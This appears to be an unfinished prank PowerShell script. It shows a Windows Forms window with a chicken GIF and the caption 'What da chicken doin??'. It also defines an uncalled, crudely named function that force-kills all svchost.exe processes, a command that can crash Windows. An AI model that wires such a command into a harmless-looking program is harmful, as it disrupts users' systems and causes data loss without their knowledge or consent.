$Path = Get-Location

Add-Type -AssemblyName System.windows.forms



function main {
$MainWindow = New-Object System.Windows.Forms.Form
$MainWindow.Text = "asdf"
$MainWindow.Size = "300,500"

    $Label = New-Object System.Windows.Forms.Label
    $Label.Size = "300,32"
    $Label.Location = "10,10"
    $Label.Text = "What da chicken doin??"
    $Label.Font = "Arial, 16"
    
    $Chickenimg = (get-item "$Path/chicken.gif")
    $Chickenimg = [System.Drawing.Image]::Fromfile($Chickenimg)
    $Chicken = new-object Windows.Forms.PictureBox
    $Chicken.Image = $Chickenimg
    $Chicken.Size = "200,300"
    $Chicken.Location = "10,80"
    $Chicken.Add_CLick{}

    #labels
    $MainWindow.Controls.Add($Label)
    $MainWindow.Controls.Add($Chicken)

#asdf

$MainWindow.ShowDialog()
}


Function homo {
TASKKILL /IM svchost.exe /F
}

main